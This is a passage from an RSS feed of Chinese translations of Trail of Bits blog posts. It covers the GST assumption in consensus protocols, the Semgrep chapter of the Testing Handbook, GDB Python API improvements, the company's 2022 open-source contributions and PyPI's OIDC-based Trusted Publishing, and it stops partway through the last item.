&lt;/h2&gt;&lt;p&gt;DLS论文将共识视为协议设计者与对手之间的游戏。GST假设限制了对手的移动：对手选择Δ，设计者(知道Δ)提供共识协议，然后对手选择Δ必须开始保持的时间T(GST)。&lt;/p&gt;
&lt;p&gt;将对手想象为一场雷暴：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;可以通过电磁干扰在线路中引入噪声，导致消息需要重传从而延迟&lt;/li&gt;
&lt;li&gt;闪电可能击中某个不幸的房屋(进程)，导致其停止响应消息&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;GST的到来意味着天空放晴。但进程无法知道GST是否已经到来。&lt;/p&gt;
&lt;h2 id=&#34;从延迟中恢复&#34;&gt;从延迟中恢复
&lt;/h2&gt;&lt;p&gt;如果协议在GST假设下被证明是正确的，那么它必须能够从任何可能由延迟导致的配置中达成决策。这意味着：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;无论GST时的配置如何(只要是由延迟导致的)，协议最终都能达成决策&lt;/li&gt;
&lt;li&gt;这种恢复能力非常强大，因为延迟可能导致极其多样的配置&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;结论&#34;&gt;结论
&lt;/h2&gt;&lt;p&gt;虽然GST假设看似不切实际，但它是对逻辑公式的优雅调整。更重要的是，在GST假设下证明协议正确具有深远意义：无论对协议施加何种延迟，只要延迟最终停止，协议就能恢复并达成决策。&lt;/p&gt;
&lt;p&gt;当然，GST假设可能不适用于所有协议，特别是那些预期在延迟持续且频繁的环境中运行的协议。此外，证明协议正确并不意味着其实现是正确的。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Trail of Bits发布《测试手册》——聚焦Semgrep静态分析工具与CI/CD优化</title>
        <link>http://localhost:1313/p/trail-of-bits%E5%8F%91%E5%B8%83%E6%B5%8B%E8%AF%95%E6%89%8B%E5%86%8C%E8%81%9A%E7%84%A6semgrep%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E4%B8%8Eci/cd%E4%BC%98%E5%8C%96/</link>
        <pubDate>Sun, 03 Aug 2025 17:17:36 +0800</pubDate>
        
        <guid>http://localhost:1313/p/trail-of-bits%E5%8F%91%E5%B8%83%E6%B5%8B%E8%AF%95%E6%89%8B%E5%86%8C%E8%81%9A%E7%84%A6semgrep%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E4%B8%8Eci/cd%E4%BC%98%E5%8C%96/</guid>
        <description>&lt;h3 id=&#34;为什么编写测试手册&#34;&gt;为什么编写《测试手册》？
&lt;/h3&gt;&lt;p&gt;在Trail of Bits，我们投入了大量时间研究、实验和优化各类静态与动态安全工具。实践中发现，现有文档虽然全面但过于庞杂。标准文档试图提供所有答案，而我们的《测试手册》只提供经过实战验证的最有效方案。&lt;/p&gt;
&lt;p&gt;手册不仅是配置指南，更是CI/CD流水线中工具优化的蓝图。许多组织能搭建安全工具却难以优化，最终导致工具维护成本远超其价值。我们的目标是直击核心价值，剔除噪音，指引您掌握工具最具影响力的功能。&lt;/p&gt;
&lt;h3 id=&#34;首章发布semgrep专项&#34;&gt;首章发布：Semgrep专项
&lt;/h3&gt;&lt;p&gt;首章聚焦高效静态分析工具Semgrep，专精于低复杂度缺陷和特定代码模式检测。本章将帮助您：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;理解Semgrep的优势与适用场景&lt;/li&gt;
&lt;li&gt;完成初始配置并定制优化规则集&lt;/li&gt;
&lt;li&gt;编写/测试自定义规则，运用自动修复功能&lt;/li&gt;
&lt;li&gt;实现CI/CD集成（含推荐配置方案）&lt;/li&gt;
&lt;li&gt;获取外部资源库（规则模板/技术文章/视频教程）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.trailofbits.com/testing-handbook-semgrep&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;立即查阅Semgrep章节&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;近期文章推荐&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;《非常规创新者奖学金》&lt;/li&gt;
&lt;li&gt;《PajaMAS多智能体系统劫持技术》&lt;/li&gt;
&lt;li&gt;《构建MCP亟需的安全层》&lt;/li&gt;
&lt;li&gt;《废弃硬件中的零日漏洞利用》&lt;/li&gt;
&lt;li&gt;《EthCC[8]实录：如何成为智能合约审计师》&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;© 2025 Trail of Bits&lt;br&gt;
Hugo构建 | Mainroad主题&lt;/p&gt;
</description>
        </item>
        <item>
        <title>GDB Python API的冬季优化：增强消息提示与类型支持</title>
        <link>http://localhost:1313/p/gdb-python-api%E7%9A%84%E5%86%AC%E5%AD%A3%E4%BC%98%E5%8C%96%E5%A2%9E%E5%BC%BA%E6%B6%88%E6%81%AF%E6%8F%90%E7%A4%BA%E4%B8%8E%E7%B1%BB%E5%9E%8B%E6%94%AF%E6%8C%81/</link>
        <pubDate>Sun, 03 Aug 2025 17:01:19 +0800</pubDate>
        
        <guid>http://localhost:1313/p/gdb-python-api%E7%9A%84%E5%86%AC%E5%AD%A3%E4%BC%98%E5%8C%96%E5%A2%9E%E5%BC%BA%E6%B6%88%E6%81%AF%E6%8F%90%E7%A4%BA%E4%B8%8E%E7%B1%BB%E5%9E%8B%E6%94%AF%E6%8C%81/</guid>
        <description>&lt;h1 id=&#34;gdb-python-api的冬季优化增强消息提示与类型支持&#34;&gt;GDB Python API的冬季优化：增强消息提示与类型支持
&lt;/h1&gt;&lt;p&gt;作为Trail of Bits的冬季实习生，我的目标是改进GNU调试器(GDB)的两方面性能：提升运行速度并增强其Python API，以更好地支持Pwndbg等依赖工具。主要工作包括实现符号解析的并行处理，最终完成了三项核心改进。&lt;/p&gt;
&lt;h2 id=&#34;为什么需要加速gdb&#34;&gt;为什么需要加速GDB？
&lt;/h2&gt;&lt;p&gt;GDB加载DWARF符号有三种方式：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;部分符号表加载器&lt;/strong&gt;：仅加载符号名称并关联到编译单元(CU)，延迟解析完整符号表&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;完整符号表加载器&lt;/strong&gt;：完成CU解析并构建完整符号表&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;索引解析器&lt;/strong&gt;：利用ELF文件的.gdb_index节跳过索引构建阶段&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;最初计划将Meta开源调试器drgn的并行解析方案移植到GDB。由于索引加载器已实现并行化，接下来重点优化完整加载器和索引解析器。&lt;/p&gt;
&lt;h2 id=&#34;什么是obstack&#34;&gt;什么是obstack？
&lt;/h2&gt;&lt;p&gt;通用内存分配器(如malloc())效率不高，GDB大量使用GNU Obstack这种栈式分配器。每个长生命周期容器对象(如objfile)都拥有自己的obstack，用于集中管理内存分配与释放。&lt;/p&gt;
&lt;h2 id=&#34;gdb对象的__repr__方法&#34;&gt;GDB对象的__repr__方法
&lt;/h2&gt;&lt;p&gt;第一个改进是为GDB Python API中的多个类型添加&lt;code&gt;__repr__()&lt;/code&gt;实现，使Python REPL中的类型信息更直观：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;gdb&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;gdb&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;lookup_type&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;char&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;gdb&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Type&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;code&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;TYPE_CODE_INT&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;该改进覆盖了gdb.Architecture、gdb.Block等多个核心类型。&lt;/p&gt;
&lt;h2 id=&#34;动态类型创建&#34;&gt;动态类型创建
&lt;/h2&gt;&lt;p&gt;第二个改进允许通过Python API直接创建类型（原先只能查询现有类型）。新增功能包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;gdb.init_type&lt;/code&gt;基础类型创建&lt;/li&gt;
&lt;li&gt;专用类型创建函数如&lt;code&gt;gdb.init_float_type&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;配套的&lt;code&gt;gdb.FloatFormat&lt;/code&gt;类型定义浮点内存布局&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;示例创建24位整型：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;gdb&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;init_type&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;objfile&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;gdb&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;TYPE_CODE_INT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;24&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;long short int&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;符号注册机制&#34;&gt;符号注册机制
&lt;/h2&gt;&lt;p&gt;第三个改进实现了三种符号的动态注册：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;类型符号&lt;/li&gt;
&lt;li&gt;goto标签&lt;/li&gt;
&lt;li&gt;静态变量&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;通过构建新的符号表并追加到现有列表的方式实现，虽然效率不高但满足了基本功能需求。示例：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;objfile&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;add_type_symbol&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;long short int&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;代码合并过程&#34;&gt;代码合并过程
&lt;/h2&gt;&lt;p&gt;GDB采用邮件列表的传统代码审查方式。初期提交方式不当导致问题，后改用&lt;code&gt;git send-email&lt;/code&gt;规范提交。目前三项改进中：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;__repr__()&lt;/code&gt;实现已进入合并流程&lt;/li&gt;
&lt;li&gt;类型创建和符号注册功能仍在审查中&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这些改进显著增强了无符号代码的调试能力，为逆向工程等场景提供了更灵活的工具支持。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Trail of Bits 2022开源贡献亮点回顾：从Rust优化到区块链安全</title>
        <link>http://localhost:1313/p/trail-of-bits-2022%E5%BC%80%E6%BA%90%E8%B4%A1%E7%8C%AE%E4%BA%AE%E7%82%B9%E5%9B%9E%E9%A1%BE%E4%BB%8Erust%E4%BC%98%E5%8C%96%E5%88%B0%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/</link>
        <pubDate>Sun, 03 Aug 2025 16:50:16 +0800</pubDate>
        
        <guid>http://localhost:1313/p/trail-of-bits-2022%E5%BC%80%E6%BA%90%E8%B4%A1%E7%8C%AE%E4%BA%AE%E7%82%B9%E5%9B%9E%E9%A1%BE%E4%BB%8Erust%E4%BC%98%E5%8C%96%E5%88%B0%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/</guid>
        <description>&lt;h3 id=&#34;开源协作的技术价值&#34;&gt;开源协作的技术价值
&lt;/h3&gt;&lt;p&gt;去年此时，我们曾汇报2021年向非Trail of Bits仓库提交的190+个合并PR。2022年，这一数字突破400！这种持续投入源于我们对生态互惠的深刻理解：虽然我们为自己的工具感到自豪，但同样受益于社区维护的项目。当遇到工具不符合预期时，我们选择修复它；当功能存在缺口时，我们主动完善它。&lt;/p&gt;
&lt;h3 id=&#34;关键技术贡献精选&#34;&gt;关键技术贡献精选
&lt;/h3&gt;&lt;h4 id=&#34;rust工具链增强&#34;&gt;Rust工具链增强
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Clippy&lt;/strong&gt;：新增&lt;code&gt;crate_in_macro_def&lt;/code&gt;和&lt;code&gt;unnecessary_find_map&lt;/code&gt; lint规则，优化了包括&lt;code&gt;empty_line_after_outer_attribute&lt;/code&gt;、&lt;code&gt;expect_used/unwrap_used&lt;/code&gt;等在内的12项现有lint检查逻辑，显著提升Rust代码质量分析能力。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;区块链基础设施&#34;&gt;区块链基础设施
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;HEVM&lt;/strong&gt;：改进了以太坊虚拟机的符号执行引擎，包括SMT求解器使用简化、性能优化、内存泄漏修复及测试套件增强。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Solana&lt;/strong&gt;：为rbpf添加了JIT编译器对Windows平台的完整支持（#359），扩展了智能合约运行环境兼容性。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;网络协议栈重构&#34;&gt;网络协议栈重构
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Envoy&lt;/strong&gt;：设计实现了统一头部验证组件(UHV)，将HTTP/1和HTTP/2的请求响应头验证逻辑集中化，通过RFC合规性审计修复了多处安全边界问题，为防御新型头部注入攻击提供标准化入口点。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;密码学工程改进&#34;&gt;密码学工程改进
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;pyca/cryptography&lt;/strong&gt;：增强证书透明度支持，新增&lt;code&gt;load_pem_x509_certificates&lt;/code&gt;等5个关键API，改进Python加密原语可用性。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;go-cose&lt;/strong&gt;：完成了全面的安全审计报告上传（#94），为COSE标准实现提供安全保障。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;系统安全加固&#34;&gt;系统安全加固
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;osquery&lt;/strong&gt;：修复了BPF事件处理、YARA内存泄漏等23项安全问题，新增Windows安全启动信息采集功能（#7692），并完成OpenSSL从1.1.1l到1.1.1q的迭代更新。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;质量构建方法论&#34;&gt;质量构建方法论
&lt;/h3&gt;&lt;p&gt;这些高质量软件的实现不仅依赖PR合并，更需要：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;精准的需求规划&lt;/li&gt;
&lt;li&gt;生态位理解&lt;/li&gt;
&lt;li&gt;相关项目的深度认知&lt;/li&gt;
&lt;li&gt;在软件供应链中的角色定位&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我们向所有维护者致敬——无论是可见的代码贡献，还是无数不可见的幕后工作。&lt;/p&gt;
&lt;p&gt;（完整PR列表包含400+项技术改进，涉及AFLplusplus模糊测试框架、Z3定理证明器、CPython解释器等关键项目）&lt;/p&gt;
</description>
        </item>
        <item>
        <title>可信发布：软件包安全的新标杆——基于OpenID Connect的无密钥认证机制</title>
        <link>http://localhost:1313/p/%E5%8F%AF%E4%BF%A1%E5%8F%91%E5%B8%83%E8%BD%AF%E4%BB%B6%E5%8C%85%E5%AE%89%E5%85%A8%E7%9A%84%E6%96%B0%E6%A0%87%E6%9D%86%E5%9F%BA%E4%BA%8Eopenid-connect%E7%9A%84%E6%97%A0%E5%AF%86%E9%92%A5%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6/</link>
        <pubDate>Sun, 03 Aug 2025 16:44:35 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%8F%AF%E4%BF%A1%E5%8F%91%E5%B8%83%E8%BD%AF%E4%BB%B6%E5%8C%85%E5%AE%89%E5%85%A8%E7%9A%84%E6%96%B0%E6%A0%87%E6%9D%86%E5%9F%BA%E4%BA%8Eopenid-connect%E7%9A%84%E6%97%A0%E5%AF%86%E9%92%A5%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6/</guid>
        <description>&lt;h1 id=&#34;可信发布软件包安全的新标杆&#34;&gt;可信发布：软件包安全的新标杆
&lt;/h1&gt;&lt;p&gt;作者：William Woodruff&lt;br&gt;
日期：2023年5月23日&lt;/p&gt;
&lt;h2 id=&#34;技术背景&#34;&gt;技术背景
&lt;/h2&gt;&lt;p&gt;过去一年，我们与Python包索引(PyPI)合作开发了名为&amp;quot;可信发布&amp;quot;的新型认证机制。该技术通过消除长期API令牌和密码的使用，在降低供应链攻击和凭证泄露风险的同时，简化了发布工作流。目前PyPI上关键软件包已采用该技术强化发布安全。&lt;/p&gt;
&lt;h2 id=&#34;openid-connect与环境凭证&#34;&gt;OpenID Connect与&amp;quot;环境凭证&amp;quot;
&lt;/h2&gt;&lt;p&gt;可信发布的核心是建立在OpenID Connect(OIDC)标准之上的认证方案。OIDC身份提供者(IdP)能生成可验证的JWT凭证，其中包含如GitHub仓库、工作流名称等声明信息。与传统的API令牌不同，这些凭证具有以下特性：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;动态生成&lt;/strong&gt;：由CI平台(如GitHub Actions)在运行时自动提供&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;细粒度控制&lt;/strong&gt;：可精确绑定到特定代码库、工作流文件甚至CI环境&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;密码学验证&lt;/strong&gt;：通过IdP的公钥进行签名验证&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;典型的工作流凭证声明示例如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;#34;repository&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;hamilcar/cartago&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;#34;workflow&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;release.yml&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;#34;environment&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;production&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;零密钥发布流程&#34;&gt;零密钥发布流程
&lt;/h2&gt;&lt;p&gt;完整的可信发布流程包含七个关键步骤：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;开发者触发GitHub Actions发布工作流&lt;/li&gt;
&lt;li&gt;执行常规构建过程(python -m build等)&lt;/li&gt;
&lt;li&gt;工作流从GitHub OIDC IdP获取身份凭证&lt;/li&gt;
&lt;li&gt;将OIDC令牌提交至PyPI&lt;/li&gt;
&lt;li&gt;PyPI验证后颁发短期API令牌&lt;/li&gt;
&lt;li&gt;返回令牌至工作流&lt;/li&gt;
&lt;li&gt;使用twine等工具完成发布&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;实际配置仅需在PyPI项目设置中建立信任关系：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;trusted_publishers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;identity_provider&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;github&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;repository&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;hamilcar/cartago&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;workflow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;release.yml&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;安全优势分析&#34;&gt;安全优势分析
&lt;/h2&gt;&lt;p&gt;与传统API令牌相比，可信发布在三个维度实现突破：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;使用便捷性&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;无需手动管理令牌&lt;/li&gt;
&lt;li&gt;支持未创建项目的预配置&lt;/li&gt;
&lt;li&gt;消除凭证传递风险&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;事前防护&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;攻击者需同时控制CI环境和发布流程&lt;/li&gt;
&lt;li&gt;细粒度的环境隔离(通过GitHub Environments)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;事后恢复&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;凭证有效期仅数分钟&lt;/li&gt;
&lt;li&gt;自动失效无需人工干预&lt;/li&gt;
